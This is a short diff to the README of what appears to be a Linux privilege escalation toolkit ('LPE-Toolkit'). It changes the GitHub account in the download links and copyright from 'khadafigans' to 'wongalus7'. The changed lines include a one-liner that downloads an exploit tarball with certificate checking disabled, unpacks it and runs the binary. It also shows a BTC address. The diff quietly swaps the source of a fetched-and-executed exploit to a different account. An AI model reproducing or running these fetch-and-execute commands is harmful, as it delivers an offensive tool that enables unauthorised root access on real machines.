@@ -114,7 +114,7 @@ xpl2026/
 
 ```bash
 # Navigate to writable directory
-wget https://github.com/khadafigans/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate
+wget https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate
 tar xzf xpl2026.tgz
 rm -rf xpl2026.tgz
 
@@ -130,7 +130,7 @@ chmod +x xpl2026
 
 ## One Liner
 ```bash
-wget https://github.com/khadafigans/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate && tar xzf xpl2026.tgz && rm -rf xpl2026.tgz && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
+wget https://github.com/wongalus7/LPE-Toolkit/raw/refs/heads/main/xpl2026.tgz --no-check-certificate && tar xzf xpl2026.tgz && rm -rf xpl2026.tgz && cd xpl2026 && chmod +x xpl2026 && ./xpl2026
 ```
 ---
 
@@ -1040,4 +1040,4 @@ EOF
 ```
 ₿ BTC: 17sbbeTzDMP4aMELVbLW78Rcsj4CDRBiZh
 ```
-© 2026 khadafigans
+© 2026 wongalus7
